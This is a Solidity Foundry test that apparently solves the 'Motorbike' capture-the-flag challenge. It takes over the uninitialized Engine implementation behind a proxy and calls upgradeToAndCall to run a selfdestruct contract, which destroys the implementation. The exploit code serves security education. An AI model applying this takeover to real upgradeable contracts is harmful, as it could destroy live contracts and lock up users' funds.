import { Test, console } from 'forge-std/Test.sol';
import { Engine, Motorbike } from '../src/Motorbike.sol';

contract SelfDestroy {
  function destroy() public {
    console.log('!!!_DESTROY_!!!');
    selfdestruct(payable(msg.sender));
  }
}

contract MotorbikeTest is Test {
  Engine engine;
  Motorbike motorbike;
  SelfDestroy selfDestroy;

  address attacker = makeAddr('attacker');

  function setUp() public {
    engine = new Engine();
    selfDestroy = new SelfDestroy();
    motorbike = new Motorbike(address(engine));
  }

  function testAttack() public {
    _logAddress();
    vm.startPrank(attacker);
    engine.initialize();

    bytes memory data = abi.encodeWithSignature('destroy()');
    engine.upgradeToAndCall(address(selfDestroy), data);
    vm.stopPrank();
  }

  function _logAddress() internal {
    console.log('--------------------------------');
    console.log('address(this)', address(this));
    console.log('address(attacker)', address(attacker));
    console.log('address(engine)', address(engine));
    console.log('address(motorbike)', address(motorbike));
    console.log('address(selfDestroy)', address(selfDestroy));
    console.log('--------------------------------');
  }
}
